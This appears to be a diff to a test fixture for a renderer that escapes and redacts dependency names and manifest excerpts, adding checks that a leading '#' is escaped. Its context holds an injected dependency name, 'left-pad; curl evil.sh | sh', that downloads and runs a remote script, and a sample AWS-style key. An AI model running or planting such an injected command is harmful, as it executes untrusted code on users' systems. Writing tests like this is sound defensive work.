@@ -30,7 +30,7 @@ recorded_output:
   rendered_dependency_name_span: "`left-pad; curl evil.sh | sh`"
   manifest_excerpt_raw: "# lockfile registry auth uses AWS key AKIA1234567890ABCDEF for private packages"
   redaction_applied: true
-  rendered_manifest_excerpt: "# lockfile registry auth uses AWS key [REDACTED] for private packages"
+  rendered_manifest_excerpt: "\\# lockfile registry auth uses AWS key [REDACTED] for private packages"
 assertions:
   - type: field_equals
     path: verdict
@@ -118,3 +118,15 @@ assertions:
   - type: require_pattern
     path: rendered_manifest_excerpt
     pattern: '\[REDACTED\]'
+  # Rule 1 — leading '#' heading escaping on the manifest_excerpt excerpt (same structural-escaping
+  # requirement as the changelog excerpt above): raw starts with a literal heading marker, and the
+  # rendered form must carry it escaped so it can never render as a Markdown heading.
+  - type: require_pattern
+    path: manifest_excerpt_raw
+    pattern: '^#'
+  - type: forbid_pattern
+    path: rendered_manifest_excerpt
+    pattern: '^#[^#\\]'
+  - type: require_pattern
+    path: rendered_manifest_excerpt
+    pattern: '^\\#'
